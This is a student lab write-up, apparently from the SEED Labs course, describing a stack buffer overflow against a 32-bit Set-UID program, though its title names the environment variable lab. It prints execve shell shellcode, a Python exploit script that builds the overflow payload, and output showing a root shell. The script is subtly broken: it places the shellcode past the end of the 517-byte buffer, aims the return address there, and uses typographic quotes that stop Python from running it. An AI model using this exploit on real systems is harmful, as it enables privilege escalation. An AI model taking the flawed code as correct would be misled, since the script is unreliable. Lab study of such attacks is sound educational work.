# SEEDlabs: Environment Variable and Set-UID Program Lab

#### Ozgur Ural
#### Student ID: 2564455


## Launching Attack on 32-bit Program (Level 1)

1. gdb stack-L1-dbg - Get the address of the bof function and the address of the buffer.

```sh
gdb-peda$ print $ebp
$1 = (void *) 0xffffcb08
gdb-peda$ print $buffer
$2 = (char (*)[100]) 0xffffca9c
```

2. Created badfile file. 
3. Modified the exploit.py file:

```c
#!/usr/bin/python3
import sys
shellcode= (
                   "\x31\xc0\x50\x68\x2f\x2f\x73"
                   "\x68\x68\x2f\x62\x69\x6e\x89"
                   "\xe3\x89\xc1\x89\xc2\xb0\x0b"
                   "\xcd\x80\x31\xc0\x40\xcd\x80"
).encode(’latin-1’)
# Fill the content with NOP’s
content = bytearray(0x90 for i in range(517))
##################################################################
# Put the shellcode somewhere in the payload
start = 517 
content[start:start + len(shellcode)] = shellcode
# Decide the return address value
# and put it somewhere in the payload
ret = 0xffffca9c+start # ✩ Need to change ✩
offset = 0xffffcb08-0xffffca9c+4 # ✩ Need to change ✩
L = 4 # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder=’little’)
##################################################################
```

4. Generate the payload and then attack.

```sh
[10/06/22]seed@VM:~/code$ ./exploit.py
[10/06/22]seed@VM:~/code$ ./stack-L1
Input size: 517
#id
uid=1000(seed) gid=1000(seed) euid=0(root) groups=1000(seed),4(adm)
```
Got root privileges.

Additional explanations about the exploit.py modifications.
- The shellcode is copied, which is 32bit assembly version of the shellcode.
- ret is the return adress, returning the first instruction of the shellcode
- offset is the interval between ebp and buffer addresses
- L equal to 4 is a 32 bit program.
